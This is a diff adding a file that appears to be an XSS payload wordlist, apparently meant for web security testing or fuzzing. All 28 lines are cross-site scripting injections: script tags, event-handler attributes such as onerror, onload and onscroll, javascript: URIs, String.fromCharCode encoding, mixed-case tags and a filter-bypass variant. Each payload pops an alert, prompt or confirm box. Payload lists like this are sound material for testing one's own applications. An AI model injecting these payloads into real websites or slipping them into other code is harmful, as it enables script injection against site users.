@@ -1,0 +1,28 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe onload=alert(1)>
+<body onload=alert(1)>
+javascript:alert(1)
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script src=data:text/javascript,alert(1)></script>
+<svg/onload=alert(1)>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<img src=x oneonerrorrror=alert(1)>
+<img src=x:alert(1) onerror=eval(src)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<body onload=alert('XSS')>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)>
+<body style=overflow:auto;height:1000px onscroll=alert(1)>
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<audio src=x onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<video><source onerror=alert(1)> 
